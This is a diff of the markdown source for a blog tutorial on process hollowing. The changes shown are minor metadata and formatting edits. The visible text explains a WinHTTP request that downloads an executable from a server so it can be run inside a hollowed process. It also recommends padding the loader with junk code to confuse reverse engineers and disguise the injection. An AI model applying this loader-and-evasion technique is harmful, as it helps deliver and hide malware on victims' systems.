@@ -1,11 +1,11 @@
 {
-"title": "Process Hollowing",
-"description": "Streaming and executing binary code securely",
+"title": "process hollowing",
+"description": "Streaming and executing arbitrary machine code",
 "tags": ["Hacking", "Windows", "C++"],
-"author": "Strayfade",
+"author": "strayfade",
 "date": "1/13/2023",
 "showTitle": true,
-"indexed": false,
+"indexed": true,
 "pinned": false
 }
 
@@ -31,10 +31,10 @@ Here, `USER_AGENT` is defined as a default User Agent (`Mozilla/5.0 (X11;...`) a
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", DOWNLOAD_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
 
--   `L"GET"` tells WinHTTP to create a `GET` request
--   `DOWNLOAD_PATH` is the path of the binaries on the server (`/cdn/file.exe`)
--   `WINHTTP_DEFAULT_ACCEPT_TYPES` tells WinHTTP to accept binary data.
--   `WINHTTP_FLAG_SECURE` tells WinHTTP that this data is served over HTTPS.
+- `L"GET"` tells WinHTTP to create a `GET` request
+- `DOWNLOAD_PATH` is the path of the binaries on the server (`/cdn/file.exe`)
+- `WINHTTP_DEFAULT_ACCEPT_TYPES` tells WinHTTP to accept binary data.
+- `WINHTTP_FLAG_SECURE` tells WinHTTP that this data is served over HTTPS.
 
 This code sends the request and reads the response into the `hRequest` variable. Below, we get the size of the transferred data to allocate memory for it.
 
@@ -84,12 +84,12 @@ Finally, we do the actual process hollowing
 
 ### More Important Things
 
-One neat thing we can do to confuse reverse-engineerers is to pad our executable with junk code, since the whole program only ends up at about 16kb. There aren't many programs that small, so we need to add junk code to make our process hollowing look like it's just running the original program. I added 2mb of filler to the program, since the binaries we were downloading were around that size.
+One neat thing we can do to confuse reverse-engineerers is to pad our executable with junk code, since the whole program only ends up at about 16kb. There aren't many useful programs which are that small, so we need to add junk code to make our process hollowing look like it's just running the original program. I added 2mb of filler to the program, since the binaries we were downloading were around that size.
 
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Pad, 0, 0, 0); // This runs in a thread after the process hollowing has finished.
 
 ### References
 
--   [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)
--   [https://github.com/adamhlt/Process-Hollowing](https://github.com/adamhlt/Process-Hollowing)
--   [https://github.com/kernelm0de/RunPE-ProcessHollowing](https://github.com/kernelm0de/RunPE-ProcessHollowing)
+- [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)
+- [https://github.com/adamhlt/Process-Hollowing](https://github.com/adamhlt/Process-Hollowing)
+- [https://github.com/kernelm0de/RunPE-ProcessHollowing](https://github.com/kernelm0de/RunPE-ProcessHollowing)
